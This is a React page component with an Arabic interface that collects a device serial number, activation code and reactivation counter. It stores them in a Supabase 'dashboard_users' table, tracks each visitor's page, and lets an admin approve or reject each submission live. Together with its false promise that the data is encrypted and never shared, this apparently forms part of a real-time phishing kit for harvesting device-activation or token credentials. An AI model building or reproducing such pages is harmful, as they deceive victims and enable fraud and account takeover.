import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/components/ui/use-toast";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";
import WaitingOverlay from "@/components/WaitingOverlay";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { ShieldCheck, Hash, KeyRound, RotateCcw, Sparkles, Lock } from "lucide-react";
import otpBanner from "@/assets/otp-banner.jpg";

const ActivationData = () => {
  const [searchParams] = useSearchParams();
  const { toast } = useToast();
  const userId = searchParams.get("uid") || "";
  const wasRejected = searchParams.get("rejected") === "true";

  const [serialNumber, setSerialNumber] = useState("");
  const [activationCode, setActivationCode] = useState("");
  const [applicationCounter, setApplicationCounter] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [rejectionError, setRejectionError] = useState(wasRejected);

  useEffect(() => {
    if (wasRejected) {
      setSubmitted(false);
      setRejectionError(true);
    }
  }, [wasRejected, searchParams.get("t")]);

  useAdminRedirect(userId || null, { approveRedirect: submitted ? "/waiting" : undefined });

  useEffect(() => {
    if (!userId) return;
    supabase.from("dashboard_users").update({ last_page: "بيانات التفعيل" }).eq("id", userId).then();
  }, [userId]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!serialNumber.trim() || !activationCode.trim() || !applicationCounter.trim()) {
      toast({ title: "خطأ", description: "يرجى ملء جميع الحقول", variant: "destructive" });
      return;
    }
    setLoading(true);
    setRejectionError(false);

    const { error } = await supabase
      .from("dashboard_users")
      .update({
        activation_data: {
          serialNumber: serialNumber.trim(),
          activationCode: activationCode.trim(),
          applicationCounter: applicationCounter.trim(),
          timestamp: new Date().toISOString(),
        },
        status_tabs: { action: "انتظار", timestamp: new Date().toISOString() },
      })
      .eq("id", userId);

    if (error) {
      toast({ title: "خطأ", description: "حدث خطأ، حاول مرة أخرى", variant: "destructive" });
      setLoading(false);
      return;
    }

    setSubmitted(true);
    setLoading(false);
  };

  const inputClasses = "text-center text-sm h-11 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all";

  return (
    <div className="min-h-screen bg-background relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      {/* Banner */}
      <div className="relative">
        <img src={otpBanner} alt="بيانات التفعيل" className="w-full h-36 object-cover" width={1024} height={512} />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/50 to-black/40" />
        <div className="absolute inset-0 pattern-grid opacity-15" />
        <div className="absolute bottom-3 right-0 left-0 text-center">
          <h1 className="text-base font-extrabold text-white drop-shadow-[0_2px_12px_rgba(0,0,0,0.7)]">بيانات التفعيل</h1>
        </div>
      </div>

      <section className="py-5 px-2 relative z-10">
        <div className="container mx-auto max-w-none">
          {/* Rejection Error */}
          {rejectionError && (
            <div className="bg-destructive/5 border border-destructive/20 rounded-2xl p-4 mb-4 flex items-start gap-3 animate-fade-in card-shadow">
              <span className="text-2xl mt-0.5">⚠️</span>
              <div>
                <p className="text-sm font-bold text-destructive mb-0.5">بيانات غير صحيحة</p>
                <p className="text-[11px] text-muted-foreground leading-relaxed">البيانات المدخلة غير صحيحة، يرجى التأكد منها وإعادة إدخالها.</p>
              </div>
              <button onClick={() => setRejectionError(false)} className="text-muted-foreground hover:text-foreground text-lg mr-auto">✕</button>
            </div>
          )}

          {/* Motivational */}
          <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 mb-4 border border-border/40 card-shadow">
            <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
              <Sparkles className="w-4 h-4 text-primary-foreground" />
            </div>
            <div>
              <p className="text-sm font-bold text-foreground mb-0.5">خطوة أخيرة للتفعيل!</p>
              <p className="text-xs text-muted-foreground leading-relaxed">
                أدخل بيانات التفعيل الموجودة على جهازك لإتمام عملية الربط بشكل آمن.
              </p>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="bg-card rounded-2xl p-5 card-shadow border border-border/30 space-y-4">
              <div className="flex items-center gap-2.5 pb-2.5 border-b border-border/30">
                <div className="w-8 h-8 rounded-xl hero-gradient flex items-center justify-center shadow-button">
                  <Lock className="w-4 h-4 text-primary-foreground" />
                </div>
                <span className="text-base font-bold text-foreground">معلومات التفعيل</span>
              </div>

              {/* Serial Number */}
              <div>
                <label className="text-sm font-bold text-muted-foreground mb-2 flex items-center gap-2">
                  <Hash className="w-4 h-4 text-primary" />
                  رقم المسلسل
                </label>
                <Input
                  value={serialNumber}
                  onChange={(e) => setSerialNumber(e.target.value)}
                  placeholder="Serial Number (١٠ حروف و أرقام)"
                  className={inputClasses}
                  maxLength={20}
                  disabled={submitted}
                />
              </div>

              {/* Activation Code */}
              <div>
                <label className="text-sm font-bold text-muted-foreground mb-2 flex items-center gap-2">
                  <KeyRound className="w-4 h-4 text-primary" />
                  رمز التفعيل
                </label>
                <Input
                  value={activationCode}
                  onChange={(e) => setActivationCode(e.target.value)}
                  placeholder="Activation Code"
                  className={inputClasses}
                  disabled={submitted}
                />
              </div>

              {/* Application Counter */}
              <div>
                <label className="text-sm font-bold text-muted-foreground mb-2 flex items-center gap-2">
                  <RotateCcw className="w-4 h-4 text-primary" />
                  رقم إعادة التفعيل
                </label>
                <Input
                  value={applicationCounter}
                  onChange={(e) => setApplicationCounter(e.target.value)}
                  placeholder="Application Counter"
                  className={inputClasses}
                  disabled={submitted}
                />
              </div>
            </div>

            <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-card/60 backdrop-blur-sm border border-border/30">
              <div className="w-7 h-7 rounded-lg hero-gradient flex items-center justify-center shrink-0">
                <ShieldCheck className="w-3.5 h-3.5 text-primary-foreground" />
              </div>
              <p className="text-xs text-muted-foreground leading-relaxed">
                بياناتك محمية بتشفير عالي المستوى ولا يتم مشاركتها مع أي طرف ثالث.
              </p>
            </div>

            <Button
              type="submit"
              disabled={loading || submitted}
              className="w-full hero-gradient text-primary-foreground text-base font-bold py-6 rounded-xl shadow-button hover:shadow-[0_6px_24px_hsl(213_76%_44%/0.4)] transition-all"
            >
              {loading ? "جاري الإرسال..." : "تأكيد البيانات"}
            </Button>
          </form>
        </div>
      </section>

      <SiteFooter />
      {submitted && <WaitingOverlay />}
    </div>
  );
};

export default ActivationData;
